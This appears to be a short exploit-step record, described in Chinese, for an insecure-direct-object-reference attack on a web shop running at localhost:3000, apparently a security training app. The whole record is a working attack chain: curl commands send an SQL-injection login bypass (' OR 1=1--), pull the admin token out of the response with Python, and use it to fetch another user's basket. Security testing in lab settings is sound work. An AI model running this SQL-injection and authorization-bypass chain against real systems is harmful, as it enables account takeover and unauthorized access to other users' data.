description: IDOR 越权访问其他用户购物篮 — SQLi 拿 admin token,带 Bearer 访问 /rest/basket/2。

steps.command: curl -s -i -X POST -H 'Content-Type: application/json' -d '{"email": "'\'' OR 1=1--", "password": "x"}' http://localhost:3000/rest/user/login 2>&1 | head -30

TOKEN=$(curl -s -X POST -H 'Content-Type: application/json' -d '{"email":"'\''  OR 1=1--","password":"x"}' http://localhost:3000/rest/user/login | python3 -c "import json,sys; print(json.load(sys.stdin)['authentication']['token'])") && curl -s -i -H "Authorization: Bearer $TOKEN" http://localhost:3000/rest/basket/2 2>&1 | head -30
